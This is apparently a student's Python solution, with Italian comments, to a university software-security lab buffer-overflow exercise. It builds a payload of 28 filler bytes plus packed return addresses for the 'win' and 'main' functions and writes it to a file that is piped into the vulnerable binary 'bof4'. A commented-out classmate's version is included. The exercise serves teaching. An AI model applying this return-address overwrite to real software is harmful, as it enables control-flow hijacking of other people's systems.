import os
import struct

#soluzione su telegram:
#ci sono due ret address da gestire --> es. fare (pattern di 28)+(ret_addr_overflown)+(ret_addr_main) 

win = 0x804849b
main = 0x80484e8

p = "a"*28 #quello che abbiamo visto (tramite peda) essere cio` che dobbiamo mettere in piu`
p += struct.pack("I", win)
p += struct.pack("I", main)

f = open("badfile", "a") #nota: la "a" sta per append e se esiste gia` il badfile riscrive alla fine QUINDI quando si riprova poi si va ad aggiungere e si arriva a troppi byte: bisogna cancellare il file dopo ogni prova e/o mettere "w" invece di "a"
f.write("%s" % p )
f.close()

#per invocare da terminale: ./bof4 < badfile !!!!!!


#si potrebbe anche creare un codice py che crea il file e poi esegue il bof4

#soluzione di mirko svolta in aula:
#import sys
#import subprocess
#
#path='/home/andrew/Software-Security-Lab-master/bof-exercise-2/bof4'
#infile=f'{path}/input.txt' #CHE PRENDE IL POSTO DI badfile
#
#buff_len=28
#win_addr=0x804849b.to_bytes(4,'little') #ma tipo little endian?
#
#buffer=b'A'*buff_len +\
#	win_addr
#
#with open(infile,'wb') as f:
#	f.write(buffer)
#	f.close()

#e poi si fa ./bof4 < input.txt
